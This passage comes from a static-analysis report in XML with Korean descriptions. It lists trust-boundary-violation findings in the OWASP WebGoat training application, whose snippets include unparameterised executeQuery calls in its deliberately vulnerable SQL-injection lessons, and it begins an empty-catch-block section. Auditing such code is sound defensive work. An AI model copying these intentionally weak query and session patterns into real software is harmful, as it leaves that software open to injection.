	    request.getSession().setAttribute("websession", mySession);
	    request.getSession().setAttribute("course", mySession.getCourse());
</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>236</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6F4D1BD4AE05B6E18C2787429F63994C" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>184</LineStart>
<Snippet>	    }
	    request.setAttribute("client.browser", clientBrowser);
	    request.getSession().setAttribute("websession", mySession);
	    request.getSession().setAttribute("course", mySession.getCourse());
</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6EE2ABCE2C87002BA68FCDD12BAC5424" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>184</LineStart>
<Snippet>	    }
	    request.setAttribute("client.browser", clientBrowser);
	    request.getSession().setAttribute("websession", mySession);
	    request.getSession().setAttribute("course", mySession.getCourse());
</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>194</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="797589F6949211F6B69C557D613469DD" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>185</LineStart>
<Snippet>	    request.setAttribute("client.browser", clientBrowser);
	    request.getSession().setAttribute("websession", mySession);
	    request.getSession().setAttribute("course", mySession.getCourse());

	    request.getRequestDispatcher(getViewPage(mySession)).forward(</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebgoatProperties.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebgoatProperties.java</FilePath>
<LineStart>44</LineStart>
<Snippet>	{
	    FileInputStream in = new FileInputStream(propertiesFileName);
	    load(in);
	}
	catch (IOException e)</Snippet>
<TargetFunction>java.util.Properties.load()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8728CA8542157724E23466F234BBB8A6" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DefaultLessonAction.java의 setSessionAttribute() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>89</LineStart>
<Snippet>	public void setSessionAttribute(WebSession s, String name, Object value)
	{
		s.getRequest().getSession().setAttribute(name, value);
	}
	</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4ACB4E4F7F4EEA8AD65B370D50F1A2F5" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 updateSession() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>495</LineStart>
<Snippet>	    // System.out.println( "HH Creating new WebSession: " );
	    session = new WebSession(this, context);
	    hs.setAttribute(WebSession.SESSION, session);
	    // reset timeout
	    hs.setMaxInactiveInterval(sessionTimeoutSeconds);</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>274</LineStart>
<Snippet>		showRequest = "true".equals( servlet.getInitParameter( SHOWREQUEST ) );
		isDebug = "true".equals( servlet.getInitParameter( DEBUG ) );
		databaseConnectionString = servlet.getInitParameter( DATABASE_CONNECTION_STRING );
		databaseDriver = servlet.getInitParameter( DATABASE_DRIVER );
		servletName = servlet.getServletName();</Snippet>
<TargetFunction>javax.servlet.GenericServlet.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F18AF1527C3F090CC67EF7509BC68659" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DefaultLessonAction.java의 setSessionAttribute() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>89</LineStart>
<Snippet>	public void setSessionAttribute(WebSession s, String name, Object value)
	{
		s.getRequest().getSession().setAttribute(name, value);
	}
	</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9DB844D513310367AA7C011A9F04E3E7" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 updateSession() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>495</LineStart>
<Snippet>	    // System.out.println( "HH Creating new WebSession: " );
	    session = new WebSession(this, context);
	    hs.setAttribute(WebSession.SESSION, session);
	    // reset timeout
	    hs.setMaxInactiveInterval(sessionTimeoutSeconds);</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>271</LineStart>
<Snippet>		enterprise = "true".equals( servlet.getInitParameter( ENTERPRISE ) );
		feedbackAddress = servlet.getInitParameter( FEEDBACK_ADDRESS ) != null ? servlet
				.getInitParameter( FEEDBACK_ADDRESS ) : feedbackAddress;
		showRequest = "true".equals( servlet.getInitParameter( SHOWREQUEST ) );
		isDebug = "true".equals( servlet.getInitParameter( DEBUG ) );</Snippet>
<TargetFunction>javax.servlet.GenericServlet.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F2D1D126B2398A493328F0D2D4811255" ruleID="CBDB6290-DF73-42E1-8D9E-3B5C4B629761">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DefaultLessonAction.java의 setRequestAttribute() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>94</LineStart>
<Snippet>	public void setRequestAttribute(WebSession s, String name, Object value)
	{
		s.getRequest().setAttribute(name, value);
	}
	</Snippet>
<TargetFunction>javax.servlet.ServletRequest.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9B15A524558BC535C06AD30E8573DB97" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DefaultLessonAction.java의 setSessionAttribute() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>89</LineStart>
<Snippet>	public void setSessionAttribute(WebSession s, String name, Object value)
	{
		s.getRequest().getSession().setAttribute(name, value);
	}
	</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="71217D319683905374BED5A505832921" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>184</LineStart>
<Snippet>	    }
	    request.setAttribute("client.browser", clientBrowser);
	    request.getSession().setAttribute("websession", mySession);
	    request.getSession().setAttribute("course", mySession.getCourse());
</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>271</LineStart>
<Snippet>		enterprise = "true".equals( servlet.getInitParameter( ENTERPRISE ) );
		feedbackAddress = servlet.getInitParameter( FEEDBACK_ADDRESS ) != null ? servlet
				.getInitParameter( FEEDBACK_ADDRESS ) : feedbackAddress;
		showRequest = "true".equals( servlet.getInitParameter( SHOWREQUEST ) );
		isDebug = "true".equals( servlet.getInitParameter( DEBUG ) );</Snippet>
<TargetFunction>javax.servlet.GenericServlet.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="87218B5F95D8A48C7E47B5B25BA16368" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>184</LineStart>
<Snippet>	    }
	    request.setAttribute("client.browser", clientBrowser);
	    request.getSession().setAttribute("websession", mySession);
	    request.getSession().setAttribute("course", mySession.getCourse());
</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8810E11FB252CBFFD39E491A06319ED6" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DefaultLessonAction.java의 setSessionAttribute() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>89</LineStart>
<Snippet>	public void setSessionAttribute(WebSession s, String name, Object value)
	{
		s.getRequest().getSession().setAttribute(name, value);
	}
	</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B2D3BBDAC9E3D81B1FE2A4FA3CDBC0B0" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>184</LineStart>
<Snippet>	    }
	    request.setAttribute("client.browser", clientBrowser);
	    request.getSession().setAttribute("websession", mySession);
	    request.getSession().setAttribute("course", mySession.getCourse());
</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>275</LineStart>
<Snippet>		isDebug = "true".equals( servlet.getInitParameter( DEBUG ) );
		databaseConnectionString = servlet.getInitParameter( DATABASE_CONNECTION_STRING );
		databaseDriver = servlet.getInitParameter( DATABASE_DRIVER );
		servletName = servlet.getServletName();
		this.context = context;</Snippet>
<TargetFunction>javax.servlet.GenericServlet.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C0132E407281BA895A31577CD93EBC7E" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DefaultLessonAction.java의 setSessionAttribute() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>89</LineStart>
<Snippet>	public void setSessionAttribute(WebSession s, String name, Object value)
	{
		s.getRequest().getSession().setAttribute(name, value);
	}
	</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DE38E89CA146EDD17FC95502D90A00CF" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>184</LineStart>
<Snippet>	    }
	    request.setAttribute("client.browser", clientBrowser);
	    request.getSession().setAttribute("websession", mySession);
	    request.getSession().setAttribute("course", mySession.getCourse());
</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>177</LineStart>
<Snippet>
	    // Redirect the request to our View servlet
	    String userAgent = request.getHeader("user-agent");
	    String clientBrowser = "Not known!";
	    if (userAgent != null)</Snippet>
<TargetFunction>javax.servlet.http.HttpServletRequest.getHeader()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="89592970D3E6F27E6E42655737FB77C3" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>185</LineStart>
<Snippet>	    request.setAttribute("client.browser", clientBrowser);
	    request.getSession().setAttribute("websession", mySession);
	    request.getSession().setAttribute("course", mySession.getCourse());

	    request.getRequestDispatcher(getViewPage(mySession)).forward(</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="AE6108FF803664930A6ED115581AD5D6" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DefaultLessonAction.java의 setSessionAttribute() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>89</LineStart>
<Snippet>	public void setSessionAttribute(WebSession s, String name, Object value)
	{
		s.getRequest().getSession().setAttribute(name, value);
	}
	</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="65057F66E32173685F0C8FFC845FC3EE" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>185</LineStart>
<Snippet>	    request.setAttribute("client.browser", clientBrowser);
	    request.getSession().setAttribute("websession", mySession);
	    request.getSession().setAttribute("course", mySession.getCourse());

	    request.getRequestDispatcher(getViewPage(mySession)).forward(</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="06E8726C8C287C1547CDB980ED8D084F" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DefaultLessonAction.java의 setSessionAttribute() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>89</LineStart>
<Snippet>	public void setSessionAttribute(WebSession s, String name, Object value)
	{
		s.getRequest().getSession().setAttribute(name, value);
	}
	</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>194</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="32">
                        <groupTitle>Poor Error Handling: Empty Catch Block</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>ReportCardScreen.java의 createContent() 메서드는 87 줄의 예외 사항을 무시합니다. 이로 인해 프로프램이 예기치 못한 상태와 조건을 간과할 수도 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>소프트웨어에 대한 대부분의 심각한 공격은 프로그래머의 가정 위반에서 비롯됩니다. 공격 후, 프로그래머의 가정은 취약하고 근거가 빈약해 보이지만 공격 전에는 많은 프로그래머가 열심히 자신의 가정을 옹호하게 마련입니다.

코드에서 흔히 발견되는 두 가지 의심스런 가정은 "이 메서드 호출은 절대 실패하지 않는다" 및 "이 호출이 실패해도 상관 없다"입니다. 프로그래머가 예외를 무시하는 경우 암시적으로 이 가정 중 하나에 따라 동작하는 것으로 볼 수 있습니다.

예제 1: 다음의 발췌된 코드는 doExchange()에서 아주 드물게 발생하는 예외 사항을 무시합니다.


try {
  doExchange();
}
catch (RareException e) {
  // this can never happen
}


RareException이 발생해도 프로그램은 아무 일도 없었던 것처럼 계속 실행됩니다. 프로그램은 특수한 상황을 나타내는 증거를 전혀 기록하지 않기 때문에 이후에 프로그램의 동작을 밝히려는 노력이 실패할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
